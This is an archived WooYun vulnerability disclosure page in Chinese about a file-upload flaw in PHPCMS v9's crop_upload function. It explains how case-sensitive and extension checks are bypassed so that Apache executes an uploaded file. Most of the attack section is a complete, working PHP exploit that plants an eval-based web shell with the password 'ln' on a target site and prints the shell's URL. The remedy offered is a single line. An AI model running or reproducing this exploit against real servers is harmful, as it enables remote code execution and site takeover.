@@ -1,0 +1,367 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPCMS v9 Getshell（Apache）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPCMS v9 Getshell（Apache）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/n3wF">n3wF</a> 
+</li><li>提交时间：		2013-02-27 23:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-02-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-04：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">phpcms v9 getshell (apache)</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞文件：phpcms\modules\attachment\attachments.php<br />
+<br />
+</p><pre><code>　　public function crop_upload() {	<br />
+		if (isset($GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;])) {<br />
+　　			$pic = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;];<br />
+　　			if (isset($_GET[&#039;width&#039;]) &amp;&amp; !empty($_GET[&#039;width&#039;])) {<br />
+　　				$width = intval($_GET[&#039;width&#039;]);<br />
+　　			}<br />
+　　			if (isset($_GET[&#039;height&#039;]) &amp;&amp; !empty($_GET[&#039;height&#039;])) {<br />
+　　				$height = intval($_GET[&#039;height&#039;]);<br />
+　　			}<br />
+　　			if (isset($_GET[&#039;file&#039;]) &amp;&amp; !empty($_GET[&#039;file&#039;])) {<br />
+　　				$_GET[&#039;file&#039;] = str_replace(&#039;;&#039;,&#039;&#039;,$_GET[&#039;file&#039;]);//过滤了分号<br />
+　　				if(is_image($_GET[&#039;file&#039;])== false || strpos($_GET[&#039;file&#039;],&#039;.php&#039;)!==false) exit();//is_image()检测是个关键<br />
+　　				if (strpos($_GET[&#039;file&#039;], pc_base::load_config(&#039;system&#039;, &#039;upload_url&#039;))!==false) {<br />
+　　					$file = $_GET[&#039;file&#039;];<br />
+　　					$basename = basename($file);//获取带有后缀的文件名<br />
+　　					if (strpos($basename, &#039;thumb_&#039;)!==false) {<br />
+　　						$file_arr = explode(&#039;_&#039;, $basename);<br />
+　　						$basename = array_pop($file_arr);<br />
+　　					}<br />
+　　					$new_file = &#039;thumb_&#039;.$width.&#039;_&#039;.$height.&#039;_&#039;.$basename;<br />
+　　				} else {<br />
+　　					pc_base::load_sys_class(&#039;attachment&#039;,&#039;&#039;,0);<br />
+　　					$module = trim($_GET[&#039;module&#039;]);<br />
+　　					$catid = intval($_GET[&#039;catid&#039;]);<br />
+　　					$siteid = $this-&gt;get_siteid();<br />
+　　					$attachment = new attachment($module, $catid, $siteid);<br />
+　　					$uploadedfile[&#039;filename&#039;] = basename($_GET[&#039;file&#039;]); <br />
+　　					$uploadedfile[&#039;fileext&#039;] = fileext($_GET[&#039;file&#039;]);<br />
+　　					if (in_array($uploadedfile[&#039;fileext&#039;], array(&#039;jpg&#039;, &#039;gif&#039;, &#039;jpeg&#039;, &#039;png&#039;, &#039;bmp&#039;))) {<br />
+　　						$uploadedfile[&#039;isimage&#039;] = 1;<br />
+　　					}<br />
+　　					$file_path = $this-&gt;upload_path.date(&#039;Y/md/&#039;);<br />
+　　					pc_base::load_sys_func(&#039;dir&#039;);<br />
+　　					dir_create($file_path);<br />
+　　					$new_file = date(&#039;Ymdhis&#039;).rand(100, 999).&#039;.&#039;.$uploadedfile[&#039;fileext&#039;];<br />
+　　					$uploadedfile[&#039;filepath&#039;] = date(&#039;Y/md/&#039;).$new_file;<br />
+　　					$aid = $attachment-&gt;add($uploadedfile);<br />
+　　				}<br />
+　　				$filepath = date(&#039;Y/md/&#039;);<br />
+　　				file_put_contents($this-&gt;upload_path.$filepath.$new_file, $pic);//文件名可控、$pic可控<br />
+　　			} else {<br />
+　　				return false;<br />
+　　			}<br />
+　　			echo pc_base::load_config(&#039;system&#039;, &#039;upload_url&#039;).$filepath.$new_file;<br />
+　　			exit;<br />
+　　		}<br />
+　　	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+后缀检测：phpcms\modules\attachment\functions\global.func.php<br />
+<br />
+</p><pre><code>function is_image($file) {<br />
+　　	$ext_arr = array(&#039;jpg&#039;,&#039;gif&#039;,&#039;png&#039;,&#039;bmp&#039;,&#039;jpeg&#039;,&#039;tiff&#039;);<br />
+　　	$ext = fileext($file);关键地方<br />
+　　	return in_array($ext,$ext_arr) ? $ext_arr :false;<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+关键函数:<br />
+<br />
+</p><pre><code>　　function fileext($filename) {<br />
+　　	return strtolower(trim(substr(strrchr($filename, &#039;.&#039;), 1, 10)));<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+　　Fileext函数是对文件后缀名的提取。<br />
+<br />
+　　根据此函数我们如果上传文件名为ddd.Php.jpg%20%20%20%20%20%20%20Php<br />
+<br />
+　　经过此函数提取到的后缀还是jpg，因此正在is_image()函数中后缀检测被绕过了。<br />
+<br />
+　　我们回到public function crop_upload() 函数中<br />
+<br />
+　　if(is_image($_GET[&#039;file&#039;])== false || strpos($_GET[&#039;file&#039;],&#039;.php&#039;)!==false) exit();<br />
+<br />
+　　在经过了is_image的判断之后又来了个.php的判断，在此程序员使用的是strpos函数<br />
+<br />
+　　这个函数是对大小写敏感的函数我们使用.Php就可以直接绕过了。<br />
+<br />
+　　经过上边的两层的过滤我们的ddd.Php.jpg%20%20%20%20%20%20%20Php后缀依然有效。<br />
+<br />
+　　最后$basename变量的值就为ddd.Php.jpg%20%20%20%20%20%20%20Php 然后使用file_put_contents函数写入到了指定目录。<br />
+<br />
+　　看见ddd.Php.jpg%20%20%20%20%20%20%20Php这个后缀，大家应该明白了，它用在apache搭建的服务器上可以被解析。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">exp:<br />
+<br />
+</p><pre><code>&lt;?php<br />
+error_reporting(E_ERROR);<br />
+set_time_limit(0);<br />
+$pass=&quot;ln&quot;;<br />
+print_r(&#039;<br />
++---------------------------------------------------------------------------+<br />
+PHPCms V9 GETSHELL 0DAY <br />
+<br />
+code by L.N.<br />
+<br />
+apache 适用(利用的apache的解析漏洞)<br />
++---------------------------------------------------------------------------+<br />
+&#039;);<br />
+if ($argc &lt; 2) {<br />
+print_r(&#039;<br />
++---------------------------------------------------------------------------+<br />
+Usage: php &#039;.$argv[0].&#039; url path<br />
+<br />
+Example: <br />
+	1.php &#039;.$argv[0].&#039; lanu.sinaapp.com<br />
+	2.php &#039;.$argv[0].&#039; lanu.sinaapp.com /phpcms<br />
++---------------------------------------------------------------------------+<br />
+&#039;);<br />
+exit;<br />
+}<br />
+<br />
+$url = $argv[1];<br />
+$path = $argv[2];<br />
+$phpshell = &#039;&lt;?php @eval($_POST[\&#039;&#039;.$pass.&#039;\&#039;]);?&gt;&#039;;<br />
+$file = &#039;1.thumb_.Php.JPG%20%20%20%20%20%20%20Php&#039;;<br />
+if($ret=Create_dir($url,$path))<br />
+{<br />
+	//echo $ret;<br />
+	$pattern = &quot;|Server:[^,]+?|U&quot;;<br />
+	preg_match_all($pattern, $ret, $matches);<br />
+	if($matches[0][0])<br />
+	{<br />
+		if(strpos($matches[0][0],&#039;Apache&#039;) == false)<br />
+		{<br />
+			echo &quot;\n亲！此网站不是apache的网站。\n&quot;;exit;<br />
+		}<br />
+	}<br />
+	$ret = GetShell($url,$phpshell,$path,$file);<br />
+	$pattern = &quot;|http:\/\/[^,]+?\.,?|U&quot;;<br />
+	preg_match_all($pattern, $ret, $matches);<br />
+	if($matches[0][0])<br />
+	{<br />
+		echo &quot;\n&quot;.&#039;密码为: &#039;.$pass.&quot;\n&quot;;<br />
+		echo &quot;\r\nurl地址: &quot;.$matches[0][0].&#039;JPG%20%20%20%20%20%20%20Php&#039;.&quot;\n&quot;;exit;<br />
+	}<br />
+	else<br />
+	{	<br />
+		$pattern = &quot;|\/uploadfile\/[^,]+?\.,?|U&quot;;<br />
+		preg_match_all($pattern, $ret, $matches);<br />
+		if($matches[0][0])<br />
+		{<br />
+			echo &quot;\n&quot;.&#039;密码为: &#039;.$pass.&quot;\n&quot;;<br />
+			echo &quot;\r\nurl地址:&quot;.&#039;http://&#039;.$url.$path.$matches[0][0].&#039;JPG%20%20%20%20%20%20%20Php&#039;.&quot;\n&quot;;exit;<br />
+		}<br />
+		else<br />
+		{<br />
+			echo &quot;\r\n没得到！\n&quot;;exit;<br />
+		}		<br />
+	}<br />
+}<br />
+<br />
+function GetShell($url,$shell,$path,$js)<br />
+{<br />
+    $content =$shell;<br />
+    $data = &quot;POST &quot;.$path.&quot;/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://&quot;.$url.$path.&quot;/uploadfile/&quot;.$js.&quot; HTTP/1.1\r\n&quot;; <br />
+    $data .= &quot;Host: &quot;.$url.&quot;\r\n&quot;;<br />
+    $data .= &quot;User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n&quot;;<br />
+    $data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;<br />
+    $data .= &quot;Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;<br />
+    $data .= &quot;Connection: close\r\n&quot;;<br />
+    $data .= &quot;Content-Length: &quot;.strlen($content).&quot;\r\n\r\n&quot;;<br />
+    $data .= $content.&quot;\r\n&quot;;<br />
+    $ock=fsockopen($url,80);<br />
+    if (!$ock) <br />
+	{<br />
+        echo &quot;\n&quot;.&quot;此网站没有回应,检测url是否输入正确&quot;.&quot;\n&quot;;exit;<br />
+    }<br />
+	else<br />
+	{<br />
+		fwrite($ock,$data);<br />
+		$resp = &#039;&#039;;<br />
+		while (!feof($ock)) <br />
+		{<br />
+			$resp.=fread($ock, 1024);<br />
+		}<br />
+		return $resp;<br />
+	}<br />
+}<br />
+<br />
+function Create_dir($url,$path=&#039;&#039;)<br />
+{<br />
+    $content =&#039;I love you&#039;;<br />
+    $data = &quot;POST &quot;.$path.&quot;/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\r\n&quot;; <br />
+    $data .= &quot;Host: &quot;.$url.&quot;\r\n&quot;;<br />
+    $data .= &quot;User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n&quot;;<br />
+    $data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;<br />
+    $data .= &quot;Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;<br />
+    $data .= &quot;Connection: close\r\n&quot;;<br />
+    $data .= &quot;Content-Length: &quot;.strlen($content).&quot;\r\n\r\n&quot;;<br />
+    $data .= $content.&quot;\r\n&quot;;<br />
+    $ock=fsockopen($url,80);<br />
+    if (!$ock) <br />
+	{<br />
+        echo &quot;\n&quot;.&quot;此网站没有回应,检测url是否输入正确&quot;.&quot;\n&quot;;exit;<br />
+    }<br />
+	fwrite($ock,$data);<br />
+    $resp = &#039;&#039;;<br />
+    while (!feof($ock)) <br />
+	{<br />
+        $resp.=fread($ock, 1024);<br />
+    }<br />
+	return $resp;<br />
+}<br />
+?&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤过滤再过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/n3wF" title="n3wF">n3wF</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019299" title="PHPCMS v9 Getshell（Apache）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-02-27 23:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19299";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
